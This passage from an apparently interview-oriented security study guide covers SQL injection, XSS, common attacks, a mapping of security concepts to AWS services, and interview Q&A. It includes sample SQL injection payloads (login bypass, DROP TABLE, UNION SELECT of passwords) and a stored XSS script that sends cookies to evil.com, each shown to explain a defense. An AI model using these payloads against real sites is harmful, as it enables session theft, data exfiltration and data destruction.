6. IP blocking: Block IPs with excessive failed attempts

AWS defenses:
- Cognito: Built-in brute force protection
- WAF: Rate limit rules
- Security Groups: Restrict SSH to known IPs (not 0.0.0.0/0)
```

### SQL Injection

```
SQL Injection:
Attacker inserts malicious SQL into user input to manipulate database.

Vulnerable code (PHP example):
$username = $_POST['username'];  // User enters: admin' OR '1'='1
$query = "SELECT * FROM users WHERE username = '$username'";

Resulting query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'

'1'='1' is always true -> Returns ALL users -> Attacker bypasses login

More dangerous:
Username: '; DROP TABLE users; --
Resulting query: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
-> Deletes entire users table!

Data exfiltration:
Username: ' UNION SELECT username, password FROM users --
-> Returns all usernames and hashed passwords

Defense:
1. Prepared statements / Parameterized queries (MOST IMPORTANT):
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
   $stmt->execute([$username]);
   -> Input is treated as data, not SQL code
   -> ''; DROP TABLE can't execute

2. Input validation: Whitelist acceptable characters
3. Least privilege: DB user should only have SELECT, not DROP
4. WAF: Detect and block SQL injection patterns
5. Error handling: Don't expose database errors to users
```

### Cross-Site Scripting (XSS)

```
XSS (Cross-Site Scripting):
Attacker injects malicious JavaScript into web pages viewed by other users.

Stored XSS (Persistent):
1. Attacker posts a comment on a website:
   "Great article! <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
2. Website stores this comment in database
3. When any user views the page, script executes in their browser
4. Script sends their session cookie to attacker
5. Attacker uses cookie to hijack their session

Reflected XSS:
URL: https://site.com/search?q=<script>alert('XSS')</script>
If site reflects the query in the page without sanitizing,
script executes in the victim's browser.

Defenses:
1. Content Security Policy (CSP) header:
   Content-Security-Policy: script-src 'self'
   (Browser only executes scripts from same origin, not injected ones)

2. Output encoding/escaping:
   < -> &lt;   > -> &gt;   " -> &quot;
   <script> rendered as text, not executed as code

3. Input sanitization: Strip/escape HTML tags from user input

4. HttpOnly cookies:
   Set-Cookie: session=abc123; HttpOnly
   (JavaScript can't read HttpOnly cookies -> cookie theft fails)

5. WAF: Detect XSS patterns in requests
```

### Other Common Attacks

```
Phishing:
- Fake login pages that look identical to real ones
- Trick users into entering credentials
- Defense: MFA (even if password stolen, attacker needs second factor), 
           FIDO2/WebAuthn (hardware keys defeat phishing entirely)

DDoS (Distributed Denial of Service):
- Flood server with massive traffic to make it unavailable
- Defense: AWS Shield (managed DDoS protection), 
           CloudFront (absorbs traffic), Auto Scaling, WAF

Credential Stuffing:
- Use leaked password databases from other sites
- Try them on your service (password reuse)
- Defense: MFA, breach detection, rate limiting, password spraying detection

Privilege Escalation:
- User with low privilege finds way to gain higher privileges
- Defense: Least privilege, patch vulnerabilities, regular security audits

Insider Threats:
- Malicious or negligent employees
- Defense: Least privilege, audit logs, separation of duties
```

---

## 10. AWS Security Mapping

```
Security Concept -> AWS Service/Feature

AUTHENTICATION:
Password-based auth    -> IAM users with passwords
API key auth           -> IAM Access Keys (Access Key ID + Secret)
SSH key auth           -> EC2 Key Pairs
MFA                    -> IAM MFA (TOTP or hardware)
OAuth/OIDC             -> IAM Identity Center, Cognito
Application user auth  -> Amazon Cognito User Pools
Federation/SSO         -> IAM Identity Center (AWS SSO)

AUTHORIZATION:
Role-Based Access      -> IAM Roles
User Permissions       -> IAM Policies (JSON)
Resource Policies      -> S3 Bucket Policies, KMS Key Policies
ACLs                   -> S3 ACLs (older, prefer bucket policies)
Network-level auth     -> Security Groups, NACLs
API Authorization      -> API Gateway authorizers, resource policies

ENCRYPTION AT REST:
S3 objects             -> SSE-S3 (AWS managed), SSE-KMS, SSE-C
EBS volumes            -> EBS Encryption with KMS
RDS databases          -> RDS Encryption with KMS
DynamoDB               -> DynamoDB Encryption at rest
Secrets                -> AWS Secrets Manager, Parameter Store (SecureString)
Key Management         -> AWS KMS (Key Management Service)

ENCRYPTION IN TRANSIT:
Web traffic            -> HTTPS with ACM certificates on ALB/CloudFront
Database connections   -> TLS for RDS/ElastiCache
Service-to-service     -> HTTPS/TLS required by AWS APIs
On-premise to AWS      -> AWS VPN (TLS), AWS Direct Connect (MACsec)

SSL/TLS CERTIFICATES:
AWS services           -> ACM (AWS Certificate Manager - FREE)
Custom/external        -> Import certificates into ACM

LOGGING AND AUDITING:
API call logging       -> AWS CloudTrail
Resource config        -> AWS Config
Application logs       -> CloudWatch Logs
Network traffic logs   -> VPC Flow Logs
DNS query logs         -> Route 53 query logging
Load balancer logs     -> ALB/NLB access logs

THREAT DETECTION:
Account threats        -> Amazon GuardDuty (ML-based threat detection)
Application vulns      -> Amazon Inspector
Secrets in code        -> Amazon CodeGuru, GitHub secret scanning

SECURITY TESTING:
Pen testing            -> Allowed for your own resources (notify AWS)
Vulnerability scans    -> Amazon Inspector

DDOS PROTECTION:
Layer 3/4 DDoS         -> AWS Shield Standard (free, automatic)
Advanced DDoS          -> AWS Shield Advanced (paid, response team)
WAF rules              -> AWS WAF

COMPLETE SECURITY PICTURE:
                  AWS Shared Responsibility Model
+--------------------------------------------------+
|  AWS Responsibility (Security OF the Cloud)      |
|  - Physical security of data centers             |
|  - Hardware/firmware security                    |
|  - Hypervisor/virtualization security            |
|  - Managed service software (S3, RDS internals)  |
+--------------------------------------------------+
|  Customer Responsibility (Security IN the Cloud) |
|  - IAM users, roles, policies                    |
|  - EC2 OS patching and hardening                 |
|  - Application security                          |
|  - Data encryption (choosing to enable it)       |
|  - Network security (security groups, NACLs)     |
|  - Monitoring and logging (CloudTrail, etc.)     |
+--------------------------------------------------+

Shared Responsibility Shifts by Service Type:
IaaS (EC2): More YOUR responsibility (OS, patching, runtime)
PaaS (RDS): Less YOUR responsibility (AWS manages OS/DB engine)
SaaS (WorkMail): Minimal YOUR responsibility (just your data/config)
```

---

## 11. Interview Q&A

### Q1: What is the difference between authentication and authorization?

**Answer:** Authentication verifies identity — "Who are you?" It answers whether someone is who they claim to be, using passwords, tokens, biometrics, or keys. Authorization determines permissions — "What can you do?" After authentication establishes identity, authorization checks what actions that identity is permitted to perform. In HTTP: 401 is an authentication error (you're not logged in), 403 is an authorization error (you're logged in but don't have permission). In AWS: IAM handles both — authentication via credentials (access keys, roles), authorization via IAM policies.

---

### Q2: What is the difference between symmetric and asymmetric encryption?

**Answer:** Symmetric encryption uses one key for both encrypting and decrypting. It's fast (AES is hardware-accelerated) and ideal for bulk data. The problem is key distribution — how do you securely share the key? Asymmetric encryption uses a key pair: public key (share freely) and private key (keep secret). Data encrypted with the public key can only be decrypted with the private key. This solves key distribution but is slow. In practice, TLS uses both: asymmetric for key exchange and symmetric (AES) for bulk data encryption.

---

### Q3: Why are passwords hashed and not encrypted?

**Answer:** If passwords were encrypted, the decryption key must be stored somewhere — if an attacker steals the database AND the key, all passwords are exposed. With hashing (a one-way function), there's nothing to decrypt. The server stores hash(password + salt) and verifies by re-hashing what the user enters. If the database is stolen, attackers only have hashes. With a slow algorithm like bcrypt and unique salts, cracking each password requires significant computation. Encryption is reversible; hashing is not — that's the critical difference.

---

### Q4: What is MFA and why is it important?

**Answer:** MFA (Multi-Factor Authentication) requires proof from two or more independent factors: something you know (password), something you have (phone/hardware token), or something you are (biometrics). It's important because it prevents account compromise from a single leaked credential. If an attacker steals your password, they still can't log in without your physical device. AWS IAM supports MFA for users and can require MFA tokens before performing sensitive actions like assuming privileged roles or deleting critical resources.

---

### Q5: What is the TLS handshake?

**Answer:** The TLS handshake is the process by which a browser and server establish a secure encrypted connection:
1. Client sends supported TLS versions and cipher suites (Client Hello)
2. Server selects cipher suite and sends its TLS certificate (Server Hello + Certificate)
3. Client validates the certificate (trusted CA, correct domain, not expired)
4. They use asymmetric cryptography (ECDHE) to agree on a shared session key without transmitting it
5. Both confirm the handshake is complete and switch to symmetric encryption (AES)
6. All subsequent data is encrypted with AES using the session key

TLS 1.3 does this in one round trip; TLS 1.2 requires two.

---

### Q6: What is SQL injection and how do you prevent it?

**Answer:** SQL injection occurs when user input is embedded directly into a SQL query without sanitization, allowing attackers to manipulate the query. For example, if username is `' OR '1'='1`, a query like `SELECT * FROM users WHERE username='$username'` becomes `SELECT * FROM users WHERE username='' OR '1'='1'` which returns all users. Prevention: Use parameterized queries/prepared statements, where input is passed as data separate from the SQL code. The database engine treats the input as literal data regardless of content. Also use input validation, WAF rules, and least-privilege database accounts.

---

### Q7: What is the principle of least privilege and why does it matter?

**Answer:** Least privilege means granting users and services only the permissions they absolutely need to do their job — nothing more. It matters because: (1) if credentials are compromised, the blast radius is limited to only what those credentials can access; (2) mistakes or bugs can only affect the limited scope of permissions; (3) it reduces insider threat damage. In AWS, instead of giving a developer AdministratorAccess, you give them only the specific IAM actions they need for their role. An EC2 instance that only needs to write to one S3 bucket should have an IAM role with only s3:PutObject on that specific bucket ARN.

---

### Q8: What does AWS IAM do?

**Answer:** AWS IAM (Identity and Access Management) handles both authentication and authorization for AWS. For authentication: it manages IAM users with passwords (for console access), access keys (for API/CLI access), IAM roles (temporary credentials for services and cross-account access). For authorization: it uses policies (JSON documents) attached to users, groups, and roles that specify which AWS services and resources can be accessed and what actions can be performed. IAM implements RBAC through roles and policies, and ABAC through policy conditions using resource tags.

---

### Q9: What is HTTPS and how is it different from HTTP?

**Answer:** HTTPS is HTTP with TLS encryption. HTTP sends everything in plaintext — anyone on the network path can read usernames, passwords, and data. HTTPS wraps HTTP in TLS, providing: encryption (data unreadable to third parties), authentication (server certificate proves you're talking to the right server), and integrity (data can't be tampered with in transit). HTTPS runs on port 443; HTTP on port 80. In AWS, ACM (Certificate Manager) provides free TLS certificates that you attach to ALBs, CloudFront, and API Gateways to enable HTTPS.

---

### Q10: What is the difference between hashing and encryption?

**Answer:** Encryption is reversible — with the correct key, you can decrypt ciphertext back to plaintext. Hashing is a one-way function — the output (hash/digest) cannot be reversed to recover the original input. Encryption is used when you need to retrieve the original data (encrypting files, HTTPS, database encrypted columns). Hashing is used when you need to verify data without storing the original (passwords — you store the hash, verify by re-hashing the input; file integrity — compare hashes to detect tampering). They serve different purposes: encryption = confidentiality + reversibility; hashing = integrity + irreversibility.

---

### Q11: What is AWS KMS?

**Answer:** AWS KMS (Key Management Service) is a managed service for creating and controlling cryptographic keys used to encrypt data. It integrates with AWS services — S3 uses KMS keys for SSE-KMS, EBS uses KMS for volume encryption, RDS uses KMS for database encryption. Key features: keys never leave KMS unencrypted, all key usage is logged in CloudTrail, supports automatic key rotation, IAM policies control who can use each key. The KMS model: your data is encrypted with a data key, the data key is encrypted with a KMS CMK (Customer Master Key). KMS is the AWS implementation of encryption at rest.

---

### Q12: What is XSS?

**Answer:** Cross-Site Scripting (XSS) is a client-side injection attack where malicious JavaScript is injected into web pages viewed by other users. In stored XSS, the attacker stores a script in the database (e.g., in a comment); every user who views the page executes the script. The script can steal cookies/session tokens (sending them to the attacker), redirect users, or perform actions as the victim. Prevention: output encoding (escape `<`, `>`, `"` before rendering user input as HTML), Content Security Policy headers (tell browsers which scripts to trust), HttpOnly cookies (prevent JavaScript from reading cookies), and input sanitization.
